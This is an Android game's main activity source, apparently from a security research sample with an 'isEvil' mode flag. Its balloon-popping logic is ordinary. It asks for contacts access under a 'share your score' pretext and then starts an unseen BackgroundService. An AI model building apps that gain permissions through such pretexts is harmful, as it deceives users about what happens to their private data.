package com.sec.iitr.balloon_game;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.MotionEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.animation.TranslateAnimation;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.Random;


public class MainActivity extends AppCompatActivity implements View.OnTouchListener {

    public static boolean isEvil;
    public static String version;
    public static int sessionID;


    int ballooncount=0;
    String selected_color="NONE";
    //HashMap<String,String> contcats_List = new HashMap<String,String>();

    //int red=-3402240;
    // int blue=-11033380;
    //int green=-6561203;

    int GREEN=1;
    int BLUE=2;
    int RED=3;
    static int PERMISSION_REQUEST_CONTACT=100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        getSupportActionBar().hide();

        setContentView(R.layout.splash_screen);

       /*getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
        View decorView = getWindow().getDecorView();
        int uiOptions = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN;
        decorView.setSystemUiVisibility(uiOptions);
        /* New Handler to start the Menu-Activity
         * and close this Splash-Screen after some seconds.*/

        new Handler().postDelayed(new Runnable(){
            @Override
            public void run() {
                /* Create an Intent that will start the Menu-Activity. */
                setContentView(R.layout.splash_screen);
                overridePendingTransition(R.anim.fadein, R.anim.fadeout);
                getPermission();
            }
        }, 1000);

        new Handler().postDelayed(new Runnable(){
            @Override
            public void run() {
                /* Create an Intent that will start the Menu-Activity. */
                overridePendingTransition(R.anim.fadein, R.anim.fadeout);
                setContentView(R.layout.activity_main);
                version="17";
                isEvil=false;
                Clues myclues=new Clues();
                myclues.SendLog("App Mode Change","App entered onCreate()","Benign");
                startGame();
            }
        }, 5000);


    }
    void getPermission()
    {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {

            // Should we show an explanation?
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Contacts access needed so you can share your score with your friend and also invite them.");
            builder.setPositiveButton(android.R.string.ok, null);
            builder.setMessage("please confirm Contacts access");//TODO put real question
            builder.setOnDismissListener(new DialogInterface.OnDismissListener() {
                @TargetApi(Build.VERSION_CODES.M)
                @Override
                public void onDismiss(DialogInterface dialog) {
                    requestPermissions(
                            new String[]
                                    {Manifest.permission.READ_CONTACTS}
                            , PERMISSION_REQUEST_CONTACT);
                }
            });
            builder.show();

        }
        else
        {
            Intent intent = new
                    Intent(MainActivity.this, BackgroundService.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startService(intent);
        }
    }



    void startGame()
    {
        final ImageView balloonView = (ImageView) findViewById(R.id.fab);
        final ImageView balloonView1 = (ImageView) findViewById(R.id.fabgreen);
        final ImageView balloonView2 = (ImageView) findViewById(R.id.fabred);
        final ImageView balloonView3 = (ImageView) findViewById(R.id.repeatfab);
        final ImageView balloonView4 = (ImageView) findViewById(R.id.repeatfabgreen);
        final ImageView balloonView5 = (ImageView) findViewById(R.id.repeatfabred);
        final Handler handler1 = new Handler();

        Runnable runnable1 = new Runnable() {
            @Override
            public void run() {

                ballooncount=0;
                new CountDownTimer(30000, 1000) {
                    final TextView texttimer= (TextView) findViewById(R.id.timer);

                    public void onTick(long millisUntilFinished) {
                        texttimer.setText("TIME:" + millisUntilFinished / 1000);
                        //here you can have your logic to set text to edittext
                    }

                    public void onFinish() {
                        texttimer.setText("TIME UP!");
                    }

                }.start();

                Random random = new Random();
                int randnum = random.nextInt(10) + 1;
                final ImageView popballoon = (ImageView) findViewById(R.id.balloonburst);
                final TextView balloonpop = (TextView) findViewById(R.id.ballcount);
                balloonpop.setText(" 0 ");

                DisplayMetrics displayMetrics = new DisplayMetrics();
                getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);

                Bitmap FixBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.greenballoon);
                final Bitmap greenballoon = Bitmap.createScaledBitmap(FixBitmap, (int) (FixBitmap.getWidth() * 0.1), (int) (FixBitmap.getHeight() * 0.1), true);

                FixBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.redballoon);
                final Bitmap redballoon = Bitmap.createScaledBitmap(FixBitmap, (int) (FixBitmap.getWidth() * 0.1), (int) (FixBitmap.getHeight() * 0.1), true);

                FixBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.blueballoon);
                final Bitmap blueballoon = Bitmap.createScaledBitmap(FixBitmap, (int) (FixBitmap.getWidth() * 0.1), (int) (FixBitmap.getHeight() * 0.1), true);

                if (randnum > 1 && randnum <= 3)
                {
                    popballoon.setImageBitmap(redballoon);
                    //selected_color=-3402240;
                    selected_color = "RED";
                } else if (randnum > 3 && randnum <= 7) {
                    popballoon.setImageBitmap(greenballoon);
                    selected_color = "GREEN";
                } else {
                    popballoon.setImageBitmap(blueballoon);
                    selected_color = "BLUE";
                    //selected_color=-balloon1.getPixel(balloon1.getWidth()/2,balloon1);
                }
                final Handler handler = new Handler();

// Define the code block to be executed
                Runnable runnable = new Runnable() {
                    @Override
                    public void run() {

                        Random rand = new Random();
                        int randInt = rand.nextInt(100) + 1;

                        TranslateAnimation animation = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.9f, Animation.RELATIVE_TO_PARENT,
                                -0.05f);
                        animation.setDuration(8000);
                        animation.setRepeatCount(-1);
                        animation.setRepeatMode(Animation.RESTART);
                        randInt = rand.nextInt(2) + 1;
                        if (randInt ==1) {

                            //Bitmap FixBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.white);
                            //final Bitmap balloon3 = Bitmap.createScaledBitmap(FixBitmap, (int) (FixBitmap.getWidth() * 0.1), (int) (FixBitmap.getHeight() * 0.1), true);

                            //balloonView.setImageBitmap(FixBitmap);
                            //balloonView.setTag("WHITE");
                            balloonView.setImageBitmap(greenballoon);
                            balloonView.setTag("GREEN");

                        } else if (randInt==2){
                            //Bitmap FixBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.white);
                            //final Bitmap balloon3 = Bitmap.createScaledBitmap(FixBitmap, (int) (FixBitmap.getWidth() * 0.1), (int) (FixBitmap.getHeight() * 0.1), true);
                            //balloonView.setImageBitmap(FixBitmap);
                            //balloonView.setTag("WHITE");
                            balloonView.setImageBitmap(blueballoon);
                            balloonView.setTag("BLUE");
                        }
                        else
                        {
                            //Bitmap FixBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.white);
                            //final Bitmap balloon3 = Bitmap.createScaledBitmap(FixBitmap, (int) (FixBitmap.getWidth() * 0.1), (int) (FixBitmap.getHeight() * 0.1), true);

                            //balloonView.setImageBitmap(FixBitmap);
                            //balloonView.setTag("WHITE");
                            balloonView.setImageBitmap(redballoon);
                            balloonView.setTag("RED");
                        }
                        balloonView.startAnimation(animation);


                        TranslateAnimation animation1 = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.9f, Animation.RELATIVE_TO_PARENT,
                                -0.10f);
                        animation1.setDuration(8000);
                        animation1.setRepeatCount(-1);
                        animation1.setRepeatMode(Animation.RESTART);

                        randInt = rand.nextInt(2) + 1;
                        if (randInt == 1) {
                            balloonView1.setImageBitmap(redballoon);
                            balloonView1.setTag("RED");
                        } else if (randInt==2){
                            balloonView1.setImageBitmap(greenballoon);
                            balloonView1.setTag("GREEN");
                        }
                        else
                        {
                            balloonView1.setImageBitmap(blueballoon);
                            balloonView1.setTag("BLUE");
                        }

                        balloonView1.startAnimation(animation1);

                        TranslateAnimation animation2 = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.9f, Animation.RELATIVE_TO_PARENT,
                                -0.20f);
                        animation2.setDuration(8000);
                        animation2.setRepeatCount(-1);
                        animation2.setRepeatMode(Animation.RESTART);
                        randInt = rand.nextInt(2) + 1;
                        if (randInt ==1) {
                            balloonView2.setImageBitmap(blueballoon);
                            balloonView2.setTag("BLUE");
                        } else  if (randInt ==2) {
                            balloonView2.setImageBitmap(redballoon);
                            balloonView2.setTag("RED");
                        }
                        else
                        {
                            balloonView2.setImageBitmap(greenballoon);
                            balloonView2.setTag("GREEN");
                        }

                        balloonView2.startAnimation(animation2);


                        randInt = rand.nextInt(2) + 1;
                        if (randInt <= 1) {
                            balloonView3.setImageBitmap(blueballoon);
                            balloonView3.setTag("BLUE");
                        } else if (randInt == 2){
                            balloonView3.setImageBitmap(greenballoon);
                            balloonView3.setTag("GREEN");
                        }
                        else
                        {
                            balloonView3.setImageBitmap(redballoon);
                            balloonView3.setTag("RED");
                        }

                        balloonView3.startAnimation(animation2);

                        randInt = rand.nextInt(2) + 1;
                        if (randInt ==1) {
                            balloonView4.setImageBitmap(redballoon);
                            balloonView4.setTag("RED");
                        } else if  (randInt ==2) {
                            balloonView4.setImageBitmap(greenballoon);
                            balloonView4.setTag("GREEN");
                        }else
                        {
                            balloonView4.setImageBitmap(blueballoon);
                            balloonView4.setTag("BLUE");
                        }


                        balloonView4.startAnimation(animation2);
                        randInt = rand.nextInt(2) + 1;
                        if (randInt== 1) {
                            balloonView5.setImageBitmap(blueballoon);
                            balloonView5.setTag("BLUE");
                        } else if (randInt== 2){
                            balloonView5.setImageBitmap(redballoon);
                            balloonView5.setTag("RED");
                        }
                        else
                        {
                            balloonView5.setImageBitmap(greenballoon);
                            balloonView5.setTag("GREEN");
                        }


                        balloonView5.startAnimation(animation);
                        handler.postDelayed(this, 8000);
                        //
                    }
                };
                handler.post(runnable);
                // Start the Runnable immediately


                final TranslateAnimation animation = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.9f, Animation.RELATIVE_TO_PARENT,
                        -0.05f);
                animation.setDuration(8000);
                animation.setRepeatCount(-1);
                animation.setRepeatMode(Animation.RESTART);

                handler1.postDelayed(this, 30000);

            }

        };
        handler1.post(runnable1);

        balloonView.setOnTouchListener(this);
        balloonView.bringToFront();
        balloonView1.setOnTouchListener(this);
        balloonView1.bringToFront();
        balloonView2.setOnTouchListener(this);
        balloonView2.bringToFront();
        balloonView3.setOnTouchListener(this);
        balloonView3.bringToFront();
        balloonView4.setOnTouchListener(this);
        balloonView4.bringToFront();
        balloonView5.setOnTouchListener(this);
        balloonView5.bringToFront();
    }
    @Override
    public boolean onTouch(View v, MotionEvent event) {
        ImageView temp=(ImageView)v;
        final int action = event.getAction();

        if (action==MotionEvent.ACTION_DOWN){
            String getcolor=temp.getTag().toString();
            Bitmap bitmap_screenshot=  getViewBitmap();

            int x=(int)event.getX();
            int y=(int)event.getY();

            //Toast.makeText(getApplicationContext(),String.valueOf(bitmap_screenshot.getWidth())+" "+String.valueOf(x)+"  "+String.valueOf(y)+ " "+String.valueOf(bitmap_screenshot.getHeight()),Toast.LENGTH_LONG).show();
            //int color=bitmap_screenshot.getPixel(x,y);
            //Toast.makeText(getApplicationContext(),String.valueOf(color),Toast.LENGTH_LONG).show();
            if(getcolor.equals(selected_color)) {
                final TranslateAnimation animation = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.0f, Animation.RELATIVE_TO_PARENT, 0.9f, Animation.RELATIVE_TO_PARENT,
                        -0.05f);
                animation.setDuration(8000);
                animation.setRepeatCount(-1);
                animation.setRepeatMode(Animation.RESTART);

                ballooncount++;
                final TextView textballoncount = (TextView) findViewById(R.id.ballcount);
                textballoncount.setText("  "+String.valueOf(ballooncount)+" ");
                Animation expandIn = AnimationUtils.loadAnimation(MainActivity.this, R.anim.pop);
                temp.startAnimation(expandIn);
                temp.startAnimation(animation);
            }
        }
        v.performClick();

        return false;
    }

    public  Bitmap getViewBitmap() {
        View screenView = getWindow().getDecorView().findViewById(android.R.id.content);
        screenView.setDrawingCacheEnabled(true);

        Bitmap bitmap = Bitmap.createBitmap(screenView.getDrawingCache());
        screenView.setDrawingCacheEnabled(false);

        int maxHeight =3000;
        int maxWidth = 3000;
        float scale = Math.min(((float)maxHeight / bitmap.getWidth()), ((float)maxWidth / bitmap.getHeight()));

        Matrix matrix = new Matrix();
        matrix.postScale(scale, scale);

        Bitmap scalebitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
        //ByteArrayOutputStream stream = new ByteArrayOutputStream();
        //scalebitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);

        ///byte[] bytes = stream.toByteArray();

        //Intent intent = new Intent(MainActivity.this, Screenshort.class);
        //intent.putExtra("BitmapImage", bytes);
        //startActivity(intent);
        return scalebitmap;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        if (requestCode==PERMISSION_REQUEST_CONTACT) {

            // If request is cancelled, the result arrays are empty.
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                Intent intent = new Intent(MainActivity.this, BackgroundService.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                startService(intent);
            } else {
                Toast.makeText(this, "No Permissions ", Toast.LENGTH_SHORT).show();
                // permission denied, boo! Disable the
                // functionality that depends on this permission.
            }
        }

    }

}
